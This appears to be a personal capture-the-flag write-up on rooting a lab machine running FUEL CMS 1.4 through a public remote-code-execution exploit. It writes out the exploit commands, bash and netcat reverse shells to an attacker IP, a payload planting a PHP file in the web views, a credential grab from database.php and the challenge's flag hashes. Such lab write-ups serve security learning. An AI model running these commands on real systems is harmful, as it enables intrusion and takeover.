# Root it

## Notes
```
FUEL CMS 1.4
https://packetstormsecurity.com/files/160080/Fuel-CMS-1.4-Remote-Code-Execution.html

export URL=http://10.10.66.191/
ruby exploit $URL ls

ruby exploit http://10.10.8.21/ 'bash -i >& /dev/tcp/10.9.18.129/4444 0>&1'
nc -e /bin/sh 10.9.18.129 4444

fule
    drwxrwxrwx  9 root root 4096 Jul 26  2019 .
    drwxrwxrwx  4 root root 4096 Jul 26  2019 ..
    drwxrwxrwx 15 root root 4096 Jul 26  2019 application
    drwxrwxrwx  8 root root 4096 Jul 26  2019 codeigniter
    drwxrwxrwx  2 root root 4096 Jul 26  2019 data_backup
    -rwxrwxrwx  1 root root   40 Jul 26  2019 index.php
    drwxrwxrwx  4 root root 4096 Jul 26  2019 install
    drwxrwxrwx  2 root root 4096 Jul 26  2019 licenses
    drwxrwxrwx  3 root root 4096 Jul 26  2019 modules
    drwxrwxrwx  2 root root 4096 Jul 26  2019 scripts

fuel/config
    MY_config.php
    MY_fuel.php
    MY_fuel_layouts.php
    MY_fuel_modules.php
    asset.php
    autoload.php
    config.php
    constants.php
    custom_fields.php
    database.php
    doctypes.php
    editors.php
    environments.php
    foreign_chars.php
    google.php
    hooks.php
    index.html
    memcached.php
    migration.php
    mimes.php
    model.php
    profiler.php
    redirects.php
    routes.php
    smileys.php
    social.php
    states.php
    user_agents.php

fuel/application/views
    _admin
    _blocks
    _docs
    _install.php
    _layouts
    _posts
    _variables
    errors
    home.php
    index.html
    offline.php
    sitemap_xml.php


Payloads:
ruby exploit $URL 'echo "<?php echo \"hi\"; ?>" > fuel/application/views/nikesh.php'


```

## Questions
1. User.txt
```
/home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b
```

2. Root.txt
```
download php revershell and mv it into fuel/application/views directory
contents from database.php file exposes password

change to root user: su root

b9bbcb33e11b80be759c4e844862482d
```